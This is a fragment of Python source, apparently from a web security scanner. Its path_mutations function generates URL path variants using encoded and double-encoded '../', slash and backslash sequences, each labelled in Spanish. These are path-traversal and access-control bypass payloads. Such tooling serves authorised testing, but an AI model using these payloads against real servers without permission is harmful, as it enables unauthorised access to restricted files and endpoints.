...
def path_mutations(path: str) -> list[tuple[str, Payload]]:
    ...
    if p.rstrip("/") and p != "/":
        ...
        add(f"{base}%2e%2e%2f", "encoded_traversal_tail", "Traversal codificado al final")
        add(f"{base}%255c", "double_encoded_backslash_trail", "Backslash final doble codificado")
        add(f"{base}%5c..%5c", "encoded_backslash_traversal", "Traversal con backslash codificado")
        add(f"{base}/..%2f", "dotdot_encoded_slash_tail", ".. con slash codificado")
        add(f"{base}/.%2e/", "dot_encoded_dot", "Variacion .%2e en tail")
        add(f"{base}/%2e%2e/", "encoded_dotdot_segment", "Segmento %2e%2e")
        add(f"{base}//%2e%2e//", "double_slash_encoded_dotdot", "Doble slash + %2e%2e")
        add(f"{base}/%2f", "encoded_slash_segment", "Segmento slash codificado")
        add(f"{base}/%5c", "encoded_backslash_segment", "Segmento backslash codificado")
        add(f"{base}/%252f", "double_encoded_slash_segment", "Segmento slash doble codificado")
        add(f"{base}/%252e%252e/", "double_encoded_dotdot_segment", "Segmento %252e%252e")
        add(f"/%2e/{base.lstrip('/')}", "encoded_dot_prefix", "Prefijo /%2e/")
        add(f"/%2e%2e/{base.lstrip('/')}", "encoded_dotdot_prefix", "Prefijo /%2e%2e/")
        add(f"/%252e/{base.lstrip('/')}", "double_encoded_dot_prefix", "Prefijo /%252e/")
        add(f"/%252e%252e/{base.lstrip('/')}", "double_encoded_dotdot_prefix", "Prefijo /%252e%252e/")
